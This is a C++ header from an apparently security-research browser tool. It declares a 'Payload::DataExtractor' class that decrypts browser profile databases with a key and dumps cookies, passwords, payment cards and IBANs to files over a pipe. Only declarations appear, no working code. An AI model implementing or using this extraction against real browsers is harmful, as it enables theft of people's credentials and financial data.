// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include "pipe_client.hpp"
#include "../../libs/sqlite/sqlite3.h"
#include <vector>
#include <string>

namespace Payload {

    class DataExtractor {
    public:
        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase);

        void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);

    private:
        sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
        
        void ExtractCookies(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile);

        std::string EscapeJson(const std::string& s);

        PipeClient& m_pipe;
        std::vector<uint8_t> m_key;
        std::filesystem::path m_outputBase;
    };

}
